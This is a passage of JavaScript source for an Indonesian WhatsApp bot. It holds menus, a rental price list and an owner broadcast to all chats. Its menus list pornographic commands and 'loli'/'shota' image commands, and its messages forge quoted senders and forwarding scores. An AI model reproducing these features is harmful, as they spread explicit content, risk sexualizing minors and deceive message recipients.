const buttons = [{buttonId: 'creatormecha', buttonText: {displayText: 'Creator bot'}, type: 1},
{buttonId: 'donasi', buttonText: {displayText: 'Donasi'}, type: 1}]
const buttonsMessage = {
locationMessage: smoji.message.locationMessage,
contentText: textsemoji,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 6
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break
case 'quotesmenu': case 'menuquotes':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let textquotes = `${Ucapan} @${sender.split('@')[0]}
${sholat}

╭━━❬ *WAKTU* ❬━━━━━━❭
│ _*• ${wib}*_
│ _*• ${wit}*_
│ _*• ${wita}*_
│ _*• Tanggal : ${tampilBulan}*_
│ _*• Tanggal Islam : ${dateIslamic}*_
└─────────────────

╭━━❬ *QUOTES MENU* ❭
│${revatod} ${prefix}quotesimage
│${revatod} ${prefix}bucin
│${revatod} ${prefix}bucin2
│${revatod} ${prefix}pantun
│${revatod} ${prefix}pantun2
│${revatod} ${prefix}quotes
│${revatod} ${prefix}quotesanime
│${revatod} ${prefix}quotesislami
│${revatod} ${prefix}quotesdilan
│${revatod} ${prefix}quotesyt
│${revatod} ${prefix}quotesmuslim
│${revatod} ${prefix}faktaunik
│${revatod} ${prefix}katabijak
│${revatod} ${prefix}cerpen
│${revatod} ${prefix}cerhor
│${revatod} ${prefix}quotemaker quotes|author
└─────────────────`
let quotesm = await getBuffer(`https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=Quotes Menu`)
let quote = await surya.prepareMessage(from, quotesm, location, {thumbnail: quotesm})
const buttons = [{buttonId: 'creatormecha', buttonText: {displayText: 'Creator bot'}, type: 1},
{buttonId: 'donasi', buttonText: {displayText: 'Donasi'}, type: 1}]
const buttonsMessage = {
locationMessage: quote.message.locationMessage,
contentText: textquotes,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 6
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break
case 'mememenu': case 'menumeme':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let textmeme = `${Ucapan} @${sender.split('@')[0]}
${sholat}

╭━━❬ *WAKTU* ❬━━━━━━❭
│ _*• ${wib}*_
│ _*• ${wit}*_
│ _*• ${wita}*_
│ _*• Tanggal : ${tampilBulan}*_
│ _*• Tanggal Islam : ${dateIslamic}*_
└─────────────────

╭━━❬ *MEME MENU* ❭
│${revatod} ${prefix}meme1 teks
│${revatod} ${prefix}meme2 teks1|teks2
│${revatod} ${prefix}meme3 teks1|teks2|teks3
│${revatod} ${prefix}meme4 teks
│${revatod} ${prefix}meme5 teks
│${revatod} ${prefix}meme6 teks1|teks2|teks3
│${revatod} ${prefix}meme7 teks1|teks2
│${revatod} ${prefix}meme8 teks1|teks2
└─────────────────`
let meme = await getBuffer(`https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=Meme Menu`)
let mem = await surya.prepareMessage(from, meme, location, {thumbnail: meme})
const buttons = [{buttonId: 'creatormecha', buttonText: {displayText: 'Creator bot'}, type: 1},
{buttonId: 'donasi', buttonText: {displayText: 'Donasi'}, type: 1}]
const buttonsMessage = {
locationMessage: mem.message.locationMessage,
contentText: textmeme,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 6
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break
case 'randommenu': case 'menurandom':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let textrandom = `${Ucapan} @${sender.split('@')[0]}
${sholat}

╭━━❬ WAKTU ❭
│➪ ${wib}
│➪ ${wit}
│➪ ${wita}
│➪ Tanggal : ${tampilBulan}
│➪ Tanggal Islam : ${dateIslamic}
└─────────────────

╭━━❬ RANDOM MENU ❭
│${free} ${prefix}apakah
│${free} ${prefix}bisakah
│${free} ${prefix}kapankah
│${free} ${prefix}hobby
│${free} ${prefix}rate
│${free} ${prefix}cekbapak
│${free} ${prefix}seberapagay
│${revatod} ${prefix}truth
│${revatod} ${prefix}dare
│${revatod} ${prefix}memeindo
│${revatod} ${prefix}covidindo
│${revatod} ${prefix}ppestetik
│${revatod} ${prefix}randomwallpaper
│${revatod} ${prefix}randombahasa
│${revatod} ${prefix}tjadian [27/11/2020]
│${revatod} ${prefix}artinama
│${revatod} ${prefix}zodiak [2005 05 21]
│${revatod} ${prefix}weton [11/11/2011]
│${revatod} ${prefix}jodoh [surya/mine]
│${revatod} ${prefix}tebakumur nama
│${revatod} ${prefix}namaninja nama
└─────────────────`
let random = await getBuffer(`https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=Random Menu`)
let rando = await surya.prepareMessage(from, random, location, {thumbnail: random})
const buttons = [{buttonId: 'creatormecha', buttonText: {displayText: 'Creator bot'}, type: 1},
{buttonId: 'donasi', buttonText: {displayText: 'Donasi'}, type: 1}]
const buttonsMessage = {
locationMessage: rando.message.locationMessage,
contentText: textrandom,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 6
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break
case 'baileysmenu': case 'menubaileys':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let textbaileys = `${Ucapan} @${sender.split('@')[0]}
${sholat}

╭━━❬ *WAKTU* ❬━━━━━━❭
│ _*• ${wib}*_
│ _*• ${wit}*_
│ _*• ${wita}*_
│ _*• Tanggal : ${tampilBulan}*_
│ _*• Tanggal Islam : ${dateIslamic}*_
└─────────────────

╭━━❬ *BAILEYS MENU* ❭
│${revatod} ${prefix}kontak nomor|nama
│${free} ${prefix}tagme
│${free} ${prefix}jadian
│${free} ${prefix}ganteng
│${free} ${prefix}cantik
│${free} ${prefix}cekprem
│${revatod} ${prefix}exo
│${revatod} ${prefix}bts
│${revatod} ${prefix}cecan
│${revatod} ${prefix}cogan
└─────────────────`
let baileys = await getBuffer(`https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=Baileys Menu`)
let bailey = await surya.prepareMessage(from, baileys, location, {thumbnail: baileys})
const buttons = [{buttonId: 'creatormecha', buttonText: {displayText: 'Creator bot'}, type: 1},
{buttonId: 'donasi', buttonText: {displayText: 'Donasi'}, type: 1}]
const buttonsMessage = {
locationMessage: bailey.message.locationMessage,
contentText: textbaileys,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 6
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break
case 'toolsmenu': case 'menutools':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let texttools = `${Ucapan} @${sender.split('@')[0]}
${sholat}

╭━━❬ *WAKTU* ❬━━━━━━❭
│ _*• ${wib}*_
│ _*• ${wit}*_
│ _*• ${wita}*_
│ _*• Tanggal : ${tampilBulan}*_
│ _*• Tanggal Islam : ${dateIslamic}*_
└─────────────────

╭━━❬ *TOOLS MENU* ❭
│${revatod} ${prefix}toimg
│${revatod} ${prefix}tovideo
│${revatod} ${prefix}tomp3
│${revatod} ${prefix}tovn
│${revatod} ${prefix}toaudio
│${revatod} ${prefix}detikvn angka
│${revatod} ${prefix}detikvideo angka
│${revatod} ${prefix}toimgbb [reply gambar]
│${revatod} ${prefix}imagedownload url
│${revatod} ${prefix}smeme reply stiker+teks
│${revatod} ${prefix}spatrik
│${revatod} ${prefix}sgawgura
│${revatod} ${prefix}sbucin
│${revatod} ${prefix}attp text
│${revatod} ${prefix}tinyurl url
│${revatod} ${prefix}imgtourl
│${revatod} ${prefix}nuliskiri text
│${revatod} ${prefix}nuliskanan text
│${revatod} ${prefix}foliokiri text
│${revatod} ${prefix}foliokanan text
│${revatod} ${prefix}translate kodebahasa [reply pesan/text]
│${revatod} ${prefix}tts kodebahasa|teks
│${revatod} ${prefix}playstore nama apk
│${free} ${prefix}listvn
│${free} ${prefix}liststicker
│${free} ${prefix}listimage
│${free} ${prefix}listrespon
└─────────────────`
let tools = await getBuffer(`https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=Tools Menu`)
let tool = await surya.prepareMessage(from, tools, location, {thumbnail: tools})
const buttons = [{buttonId: 'creatormecha', buttonText: {displayText: 'Creator bot'}, type: 1},
{buttonId: 'donasi', buttonText: {displayText: 'Donasi'}, type: 1}]
const buttonsMessage = {
locationMessage: tool.message.locationMessage,
contentText: texttools,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 6
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break
case 'tovideo': case 'tv':
if (!isQuotedSticker) return reply('Reply stiker nya')
Flink(mess.wait)
let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
let media = await surya.downloadAndSaveMediaMessage(encmedia)
let a = await webp2gifFile(media)
let mp4 = await getBuffer(a.result)
surya.sendMessage(from, mp4, video, {mimetype: 'video/mp4', quoted: msg, caption: mess.success})
fs.unlinkSync(media)
break
case 'tomp3': case 'getmp3':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isQuotedVideo) return reply(`Format salah!!\nExample : Reply video dengan caption ${prefix + command}`)
Flink(mess.wait)
let blabla = JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
let au = await surya.downloadAndSaveMediaMessage(blabla)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${au} ${ran}`, (err) => {
fs.unlinkSync(au)
if (err) return reply(mess.error.api)
let buffer = fs.readFileSync(ran)
surya.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: msg})
fs.unlinkSync(ran)
})
break
case 'stalkermenu': case 'menustalker':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let textstalker = `${Ucapan} @${sender.split('@')[0]}
${sholat}


╭━━❬ *WAKTU* ❬━━━━━━❭
│ _*• ${wib}*_
│ _*• ${wit}*_
│ _*• ${wita}*_
│ _*• Tanggal : ${tampilBulan}*_
│ _*• Tanggal Islam : ${dateIslamic}*_
└─────────────────

╭━━❬ *STALKER MENU* ❭
│${revatod} ${prefix}igstalk username
│${revatod} ${prefix}ghstalk username
│${revatod} ${prefix}tiktokstalk username
└─────────────────`
let stalker = await getBuffer(`https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=Stalker Menu`)
let stalk = await surya.prepareMessage(from, stalker, location, {thumbnail: stalker})
const buttons = [{buttonId: 'creatormecha', buttonText: {displayText: 'Creator bot'}, type: 1},
{buttonId: 'donasi', buttonText: {displayText: 'Donasi'}, type: 1}]
const buttonsMessage = {
locationMessage: stalk.message.locationMessage,
contentText: textstalker,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 6
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break
case 'animemenu': case 'menuanime':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let textanime = `${Ucapan} @${sender.split('@')[0]}
${sholat}

╭━━❬ *WAKTU* ❭
│➪ ${wib}
│➪ ${wit}
│➪ ${wita}
│➪ Tanggal : ${tampilBulan} 
└─────────────────

╭━━❬ *ANIME MENU* ❭
│${revatod} ${prefix}waifu
│${revatod} ${prefix}loli
│${revatod} ${prefix}nekonime
│${revatod} ${prefix}megumin
│${revatod} ${prefix}sagiri
│${revatod} ${prefix}shinobu
│${revatod} ${prefix}kanna
│${revatod} ${prefix}elf
│${revatod} ${prefix}neko
│${revatod} ${prefix}shota
│${revatod} ${prefix}animefanart
│${revatod} ${prefix}wallnime
│${revatod} ${prefix}husbu
│${revatod} ${prefix}lewdk
│${revatod} ${prefix}cosplay
│${revatod} ${prefix}milf
│${revatod} ${prefix}otakdesu [kawaii]
└─────────────────`
let animem = await getBuffer(`https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=Anime Menu`)
let anim = await surya.prepareMessage(from, animem, location, {thumbnail: animem})
const buttons = [{buttonId: 'creatormecha', buttonText: {displayText: 'Creator bot'}, type: 1},
{buttonId: 'donasi', buttonText: {displayText: 'Donasi'}, type: 1}]
const buttonsMessage = {
locationMessage: anim.message.locationMessage,
contentText: textanime,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 6
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break
case 'nsfwmenu': case 'menunsfw':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let textnsfw = `${Ucapan} @${sender.split('@')[0]}
${sholat}

╭━━❬ WAKTU ❭
│➪ ${wib}
│➪ ${wit}
│➪ ${wita}
│➪ Tanggal : ${tampilBulan} 
└─────────────────

╭━━❬ NSFW MENU ❭
│${revatod} ${prefix}ecchi
│${revatod} ${prefix}ahegao
│${revatod} ${prefix}hentai4everyone
│${revatod} ${prefix}nsfwcum
│${revatod} ${prefix}nsfwero
│${revatod} ${prefix}nsfwtrap
│${revatod} ${prefix}lewdanimegirls
│${revatod} ${prefix}animearmpits
│${revatod} ${prefix}elf
│${revatod} ${prefix}neko
│${revatod} ${prefix}sideoppai
│${revatod} ${prefix}hololewd
│${revatod} ${prefix}animebooty
│${revatod} ${prefix}hentai
│${revatod} ${prefix}lewdk
│${revatod} ${prefix}bokep1
│${revatod} ${prefix}bokep2
│${revatod} ${prefix}bokep3
│${revatod} ${prefix}bokep4
│${revatod} ${prefix}bokep5
│${revatod} ${prefix}bokep6
│${revatod} ${prefix}bokep7
│${revatod} ${prefix}bokep8
│${revatod} ${prefix}bokep9
│${revatod} ${prefix}bokep10
│${revatod} ${prefix}bokep11
│${revatod} ${prefix}bokep12
│${revatod} ${prefix}bokep13
│${revatod} ${prefix}bokep14
│${revatod} ${prefix}bokep15
│${revatod} ${prefix}bokep16
│${revatod} ${prefix}bokep17
│${revatod} ${prefix}bokep18
│${revatod} ${prefix}bokep19
│${revatod} ${prefix}bokep20
│${revatod} ${prefix}bokep21
│${revatod} ${prefix}bokep22
│${revatod} ${prefix}bokep23
└─────────────────`
let nsfwm = await getBuffer(`https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=Nsfw Menu`)
let nsfw = await surya.prepareMessage(from, nsfwm, location, {thumbnail: nsfwm})
const buttons = [{buttonId: 'creatormecha', buttonText: {displayText: 'Creator bot'}, type: 1},
{buttonId: 'donasi', buttonText: {displayText: 'Donasi'}, type: 1}]
const buttonsMessage = {
locationMessage: nsfw.message.locationMessage,
contentText: textnsfw,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 6
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break
case 'sewabot':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
mentions(`${Ucapan} @${sender.split('@')[0]}
${sholat}

╭━━❬ *WAKTU* ❬━━━━━━❭
│ _*• ${wib}*_
│ _*• ${wit}*_
│ _*• ${wita}*_
│ _*• Tanggal : ${tampilBulan}*_
│ _*• Tanggal Islam : ${dateIslamic}*_
└─────────────────

╭━━❬ *SEWA BOT* ❭
│• 1 Hari : 1K
│• 1 Minggu : 7K
│• 1 Bulan : 30K
│
│> *JADI USER PREMIUM*
│ 10K/Bulan
│
│> *JADI OWNER*
│ 30K/Bulan
│
│> *VIA PEMBAYARAN*
│ PULSA
│ DANA
│
│> *KELEBIHAN SEWA BOT*
│• Untuk menjaga grup
│• Untuk menyambut member baru
│• Banyak fitur keren
│• Murah dan aman
│• Bot fast respon
│• Bot always online tergantung sinyal
│• Bot dapat kick member yang melanggar secara otomatis
│• Bot dapat berkomunikasi
│ 
│> *Hubungi*
│ wa.me/62895415497664
└─────────────────`, [sender], true)
}
break

case 'menu3':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let stasus = await surya.getStatus(`${sender.split('@')[0]}@c.us`)
let stsmemek = stasus.status == 401 ? 'Bio di private': 'Bio di private'
let cokLevel = level.getLevelingLevel(sender, _level)
let cokExp = level.getLevelingXp(sender, _level)
let cokRequiredExp = 10 * Math.pow(cokLevel, 2) + 50 * cokLevel + 100
let cokRank = level.getUserRank(sender, _level)
let imeu = await surya.prepareMessage('0@s.whatsapp.net', suryaImg, image, {thumbnail: suryaImg}) 
let imeg = imeu.message.imageMessage
let resis = await surya.prepareMessageFromContent(from,{
"productMessage": {
"product": {
"productImage": imeg,
"productId": suryaImg,
"title": `LIST MENU FEATURE`,
"description": `${Ucapan}@${sender.split('@')[0]}

*❏ About Mecha*
├⟢ _*Name : © ᴍᴇᴄʜᴀ ʙᴏᴛᴢ VIP*_
├⟢ _*Type : Nodejs*_
├⟢ _*Platform : Android*_
├⟢ _*Baterai : ${baterai.baterai}% - ${baterai.cas === 'true' ? 'Charged' : 'Not charged'}*_
├⟢ _*Device : Xiaomi*_
├⟢ _*Creator bot : @${Suryaa.split('@')[0]}*_
├⟢ _*Waktu : ${timesNow}*_
├⟢ _*Runtime : ${runtime(process.uptime())}*_
├⟢ _*Total hit : ${hit_today.length}*_
├⟢ _*Total User : ${pendaftar.length}*_
├⟢ _*Total Register : ${_registered.length}*_
└⟢ _*Versi : Mecha Botz Update Versi 19*_

*❏ Your Info*
├⟢ _*Name : ${pushname}*_
├⟢ _*Number : @${sender.split('@')[0]}*_
├⟢ _*Bio : ${stsmemek}*_
├⟢ _*Status : ${isOwner ? 'Owner' : isPremium ? 'Premium' : 'Gratisan'}*_
├⟢ _*Limit : ${isPremium ? 'Unlimited' : `${getLimit(sender, limitCount, limit)}/${limitCount}`}*_
├⟢ _*Limit game : ${cekGLimit(sender, gcount, glimit)}/${gcount}*_
├⟢ _*Balance : $${getBalance(sender, balance)}*_
├⟢ _*Expired prem : ${isOwner ? 'Permanen' : isPremium ? expired : 'Not Premium'}*_
├⟢ _*EXP : ${cokExp}/${cokRequiredExp}*_
├⟢ _*Level : ${cokLevel}*_
├⟢ _*Rank : ${rank}*_
└⟢ _*Top rank : ${cokRank}*_

${MENU}`,
"currencyCode": "IDR",
"priceAmount1000": "10000",
"productImageCount": 1
},
"businessOwnerJid": "62895415497664@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": false
}
}
}, {mentionedJid: [sender, Suryaa], quoted:ftroli}) 
surya.relayWAMessage(resis)
const cokmemek = [{buttonId: 'listprem', buttonText: {displayText: 'List Premium'}, type: 1},
{buttonId: 'sewabot', buttonText: {displayText: 'Sewa Botz'}, type: 1},
{buttonId: 'rules', buttonText: {displayText: 'Rules Botz'}, type: 1}]
const cokasuMessage = {
imageMessage: imeu.message.imageMessage,
contentText: `${Ucapan} @${sender.split('@')[0]}`,
//footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: cokmemek,
headerType: 4
}
surya.sendMessage(from, cokasuMessage, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
"forwardingScore": 1000,
isForwarded: false,
sendEphemeral: true,
"externalAdReply": {
"title": `Hallo ${pushname}` ,
"body": `${Ucapan}`,
"mediaType": "2",
"thumbnailUrl": "https://i.ibb.co/v1cj7xp/820baf60f67e.jpg",
"mediaUrl": "https://youtu.be/3jYbJq2JMiM",
"thumbnail": fs.readFileSync('./sticker/mecha.jpeg'),
"sourceUrl": "https://www.instagram.com/surya_skylark05",
},mentionedJid:[Suryaa, sender]}, quoted : ftroli})
break

case 'suryabc': case 'mechabc':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2 && !isBan) return mentions(mess.OnlySurya, [Suryaa], true)
if (args.length < 2) return textImg(`Masukkan text`)
var buttontext = 'Iya 🙂'
var txtbc = `
「 ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʀᴏᴀᴅᴄᴀsᴛ 」

${q}`
let chiits = await surya.chats.all()
if (isImage || isQuotedImage) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
let meda = await surya.downloadMediaMessage(encmedia)
for (let i of chiits){
//surya.sendMessage(i.jid, media, image, {caption: txtbc})
let bcot = await surya.prepareMessage(from, meda, location, {thumbnail: meda})
const buttons = [{buttonId: 'verify', buttonText: {displayText: `${buttontext}`}, type: 1},{buttonId: 'Infoupdate', buttonText: {displayText: 'Info Update 🌹'}, type: 1}]
const buttonsMessage = {
locationMessage: bcot.message.locationMessage,
contentText: `${q}`,
footerText: `ʙʀᴏᴀᴅᴄᴀsᴛ ʟᴏᴄᴀᴛɪᴏɴ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ
_*© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}*_`,
buttons: buttons,
headerType: 6
}

surya.sendMessage(i.jid, buttonsMessage, MessageType.buttonsMessage, {contextInfo: { forwardingScore: 1000, isForwarded: true, mentionedJid: [Suryaa, '0@s.whatsapp.net']},quoted: ftroli, caption: txtbc})
}
textImg(`Sukses ${pushname}`)
} else if (isVideo || isQuotedVideo) {
let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
let mevid = await surya.downloadMediaMessage(encmedia)
for (let i of chiits){
//surya.sendMessage(i.jid, mevid, video, {caption: txtbc})
let bcnya = await surya.prepareMessage(from, mevid, video, {thumbnail: suryaImg})
const buttons = [{buttonId: '210505', buttonText: {displayText: `⬡ 𝗩𝗘𝗥𝗜𝗙𝗬`}, type: 1}]
const buttonsMessage = {
videoMessage: bcnya.message.videoMessage,
contentText: `${q}`,
footerText: `ʙʀᴏᴀᴅᴄᴀsᴛ ᴠɪᴅᴇᴏ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ
_*© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}*_`,
buttons: buttons,
headerType: 5
}

surya.sendMessage(i.jid, buttonsMessage, MessageType.buttonsMessage, {contextInfo: { forwardingScore: 1000, isForwarded: true, mentionedJid: [Suryaa, '0@s.whatsapp.net']},quoted: ftroli, caption: txtbc})
}
textImg(`Sukses ${pushname}`)
} else if (isSticker || isQuotedSticker) {
let stiknya = isQuotedSticker ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
let stk = await surya.downloadMediaMessage(stiknya)
for (let i of chiits){
surya.sendMessage(i.jid, stk, sticker, {quoted: { key: { fromMe: false, participant: '0@s.whatsapp.net', ...(from ? { remoteJid: from } : {}) }, message: { conversation: `ʙʀᴏᴀᴅᴄᴀsᴛ sᴛɪᴄᴋᴇʀ\n${q}` }}})
}
textImg(`Sukses ${pushname}`)
} else if (isAudio || isQuotedAudio) {
let audionya = isQuotedAudio ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
let mp3nya = await surya.downloadMediaMessage(audionya)
for (let i of chiits){
surya.sendMessage(i.jid, mp3nya, audio, {quoted: { key: { fromMe: false, participant: '0@s.whatsapp.net', ...(from ? { remoteJid: from } : {}) }, message: { conversation: `ʙʀᴏᴀᴅᴄᴀsᴛ ᴀᴜᴅɪᴏ\n${q}` }}})
}
textImg(`Sukses ${pushname}`)
} else {
for (let i of chiits){
const buttons = [{buttonId: 'verify', buttonText: {displayText: '⬡ 𝗩𝗘𝗥𝗜𝗙𝗬 '}, type: 1}]
const buttonsMessage = {
contentText: `${q}`,
buttons: buttons,
footerText: `ʙʀᴏᴀᴅᴄᴀsᴛ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ
_*© Surya X Mecha Botz*_`,
headerType: 1
}
surya.sendMessage(i.jid, buttonsMessage, MessageType.buttonsMessage, {contextInfo: { forwardingScore: 1000, isForwarded: false, mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: ftroli, caption: txtbc})
}
textImg(`Sukses ${pushname}`)
}
break

case 'linkwa':
            if(!q) return reply('cari group apa?')
            hx.linkwa(q)
            .then(result => {
            let res = '*「 _LINK WA_ 」*\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break

case 'bansos':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isMiningOn) return mentions(`Maaf ${pushname} fitur mining tidak diaktifkan oleh @${Suryaa.split('@')[0]}`, [Suryaa], true)
if (isMuted) return
if (isBan) return 
const amountExps = Math.floor(Math.random() * (15 - 25 + 1) + 20)
level.addLevelingXp(sender, amountExps, _level)
let sryaa = randomNomor(1000)
addBalance(sender, sryaa, balance)
textImg(`Kamu bagian dari prabayar, aku akan berikan sebanyak *${amountExps}* Exp dan *$${sryaa}* balance untuk anda!`)
break

case 'level': case 'exp':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
